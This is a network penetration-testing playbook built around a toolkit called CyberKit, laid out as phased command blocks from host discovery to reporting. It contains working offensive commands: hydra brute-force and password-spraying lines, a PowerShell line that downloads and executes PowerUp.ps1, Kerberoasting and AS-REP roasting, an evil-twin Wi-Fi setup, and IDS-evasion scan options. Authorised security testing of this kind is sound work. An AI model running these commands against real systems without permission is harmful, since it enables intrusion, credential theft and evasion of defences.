# Network Penetration Testing Playbook

## Overview
Comprehensive network security assessment methodology using CyberKit tools for both internal and external network testing.

## Prerequisites
- CyberKit Docker container with network capabilities
- Target network ranges identified
- Proper authorization and scope definition
- API keys configured for enhanced intelligence

## Phase 1: Network Discovery

### 1.1 Network Enumeration
```bash
# Host discovery
./offensive/network-scan.sh -t 192.168.1.0/24 -o /home/cyberkit/engagements/network-test

# Comprehensive host discovery
nmap -sn 192.168.1.0/24 -oA host-discovery

# Live host identification
nmap -sn --host-timeout 30s 10.0.0.0/16 | grep "Nmap scan report" | awk '{print $5}' > live-hosts.txt
```

### 1.2 Port Scanning
```bash
# Quick port scan on live hosts
nmap -F -iL live-hosts.txt -oA quick-scan

# Comprehensive TCP scan
nmap -sS -p- -T4 -iL live-hosts.txt -oA full-tcp-scan

# UDP scan (top ports)
nmap -sU --top-ports 1000 -iL live-hosts.txt -oA udp-scan
```

### 1.3 Service Enumeration
```bash
# Service version detection
nmap -sV -sC -p- -iL live-hosts.txt -oA service-enum

# Operating system detection
nmap -O -iL live-hosts.txt -oA os-detection

# Aggressive scan with scripts
nmap -A -iL live-hosts.txt -oA aggressive-scan
```

## Phase 2: Service Analysis

### 2.1 Web Services Discovery
```bash
# Identify web servers
grep -E "(80|443|8080|8443)" service-enum.nmap | awk '{print $2}' > web-servers.txt

# Web technology fingerprinting
httpx -l web-servers.txt -tech-detect -title -status-code -o web-services.txt

# Screenshot web applications
httpx -l web-servers.txt -screenshot -o screenshots/
```

### 2.2 Database Services
```bash
# MySQL enumeration
nmap --script mysql-enum -p 3306 -iL live-hosts.txt

# MSSQL enumeration
nmap --script ms-sql-info -p 1433 -iL live-hosts.txt

# PostgreSQL enumeration
nmap --script pgsql-brute -p 5432 -iL live-hosts.txt

# MongoDB enumeration
nmap --script mongodb-info -p 27017 -iL live-hosts.txt
```

### 2.3 File Sharing Services
```bash
# SMB enumeration
nmap --script smb-enum-shares,smb-enum-users -p 445 -iL live-hosts.txt

# NFS enumeration
nmap --script nfs-ls,nfs-showmount -p 2049 -iL live-hosts.txt

# FTP enumeration
nmap --script ftp-anon,ftp-bounce -p 21 -iL live-hosts.txt
```

## Phase 3: Vulnerability Assessment

### 3.1 Automated Vulnerability Scanning
```bash
# Nuclei vulnerability scan
nuclei -l live-hosts.txt -severity critical,high,medium -o network-vulns.txt

# Nmap vulnerability scripts
nmap --script vuln -iL live-hosts.txt -oA vuln-scan

# OpenVAS scan (if available)
# omp -u admin -w admin --xml="<get_tasks/>"
```

### 3.2 Service-Specific Vulnerability Testing
```bash
# SSH vulnerabilities
nmap --script ssh-hostkey,ssh-auth-methods -p 22 -iL live-hosts.txt

# HTTP/HTTPS vulnerabilities
nmap --script http-vuln-* -p 80,443 -iL live-hosts.txt

# SMB vulnerabilities
nmap --script smb-vuln-* -p 445 -iL live-hosts.txt
```

### 3.3 SSL/TLS Assessment
```bash
# SSL/TLS configuration testing
nmap --script ssl-enum-ciphers -p 443 -iL live-hosts.txt

# SSL certificate analysis
nuclei -l live-hosts.txt -tags ssl,tls -o ssl-issues.txt
```

## Phase 4: Credential Attacks

### 4.1 Default Credentials Testing
```bash
# Common default credentials
nuclei -l live-hosts.txt -tags login,default-creds -o default-creds.txt

# Service-specific defaults
nmap --script http-default-accounts -p 80,443 -iL live-hosts.txt
```

### 4.2 Brute Force Attacks
```bash
# SSH brute force
hydra -L /usr/share/seclists/Usernames/Names/names.txt -P /usr/share/wordlists/rockyou.txt ssh://192.168.1.10

# RDP brute force
hydra -L users.txt -P passwords.txt rdp://192.168.1.20

# HTTP form brute force
hydra -L users.txt -P passwords.txt 192.168.1.30 http-post-form "/login:username=^USER^&password=^PASS^:Failed"
```

### 4.3 Password Spraying
```bash
# Domain password spraying (if in domain environment)
# Use collected usernames with common passwords
hydra -L domain-users.txt -p "Password123!" smb://192.168.1.0/24
```

## Phase 5: Post-Exploitation

### 5.1 Privilege Escalation
```bash
# Linux privilege escalation enumeration
# (After gaining initial access)
# ./linpeas.sh

# Windows privilege escalation
# powershell -ep bypass -c "IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Privesc/PowerUp.ps1'); Invoke-AllChecks"
```

### 5.2 Lateral Movement
```bash
# Network shares enumeration
smbclient -L //192.168.1.10 -U guest

# ARP table analysis
arp -a

# Internal network discovery from compromised host
nmap -sn 10.0.0.0/8 172.16.0.0/12 192.168.0.0/16
```

### 5.3 Data Exfiltration Simulation
```bash
# Identify sensitive data locations
find / -name "*.pdf" -o -name "*.doc*" -o -name "*.xls*" 2>/dev/null

# Database enumeration
mysql -u root -p -e "SHOW DATABASES;"
```

## Phase 6: Active Directory Assessment

### 6.1 Domain Enumeration
```bash
# Domain controller identification
nmap --script smb-os-discovery -p 445 192.168.1.0/24

# LDAP enumeration
nmap --script ldap-search --script-args 'ldap.username="",ldap.password=""' -p 389 192.168.1.10
```

### 6.2 Kerberos Attacks
```bash
# Kerberoasting (if credentials available)
# GetUserSPNs.py domain.local/user:password -dc-ip 192.168.1.10 -request

# AS-REP Roasting
# GetNPUsers.py domain.local/ -usersfile users.txt -format hashcat -outputfile hashes.txt
```

## Phase 7: Wireless Network Assessment

### 7.1 Wireless Reconnaissance
```bash
# WiFi network discovery
./offensive/wifi-toolkit.sh scan -i wlan0

# Access point enumeration
./defensive/wifi-defence.sh monitor -i wlan0 -t 300
```

### 7.2 Wireless Attacks
```bash
# WPA handshake capture
./offensive/wifi-toolkit.sh capture -i wlan0 -b target_bssid

# Evil twin attack setup
./offensive/wifi-toolkit.sh eviltwin -i wlan0 -s "Corporate WiFi"
```

## Phase 8: Network Defense Evasion

### 8.1 Firewall Evasion
```bash
# Fragmented packet scan
nmap -f -sS target_ip

# Decoy scanning
nmap -D RND:10 target_ip

# Source port manipulation
nmap --source-port 53 target_ip
```

### 8.2 IDS/IPS Evasion
```bash
# Slow scan to avoid detection
nmap -T1 target_ip

# Random data length
nmap --data-length 25 target_ip
```

## Phase 9: Reporting and Documentation

### 9.1 Evidence Collection
```bash
# Screenshot collection
mkdir -p /home/cyberkit/evidence/network-test/
cp screenshots/* /home/cyberkit/evidence/network-test/

# Log consolidation
cat *.nmap *.txt > /home/cyberkit/reports/network-assessment-findings.txt
```

### 9.2 Risk Assessment
```bash
# Generate vulnerability summary
echo "# Network Penetration Test Report" > /home/cyberkit/reports/network-report.md
echo "## Critical Findings" >> /home/cyberkit/reports/network-report.md
grep -i "critical\|high" network-vulns.txt >> /home/cyberkit/reports/network-report.md
```

## Tools Used
- **nmap** - Network discovery and port scanning
- **nuclei** - Vulnerability assessment
- **hydra** - Brute force attacks
- **httpx** - HTTP service analysis
- **smbclient** - SMB enumeration
- **masscan** - High-speed port scanning

## Network Ranges for Testing
### Internal Networks
- 10.0.0.0/8 (Class A private)
- 172.16.0.0/12 (Class B private)
- 192.168.0.0/16 (Class C private)

### External Testing
- Only test ranges you own or have explicit permission to test
- Use proper scope documentation

## Common Network Services and Ports
- **HTTP/HTTPS**: 80, 443, 8080, 8443
- **SSH**: 22
- **RDP**: 3389
- **SMB**: 139, 445
- **DNS**: 53
- **LDAP**: 389, 636
- **Database**: 1433 (MSSQL), 3306 (MySQL), 5432 (PostgreSQL)

## Best Practices
1. Always operate within defined scope
2. Document methodology and findings
3. Use rate limiting to avoid service disruption
4. Verify findings manually
5. Coordinate with network administrators
6. Follow responsible disclosure timelines
7. Maintain operational security (OPSEC)

## Legal and Ethical Considerations
- Obtain written authorization before testing
- Respect service availability and business operations
- Follow company policies and legal requirements
- Document all activities for compliance
- Report findings through proper channels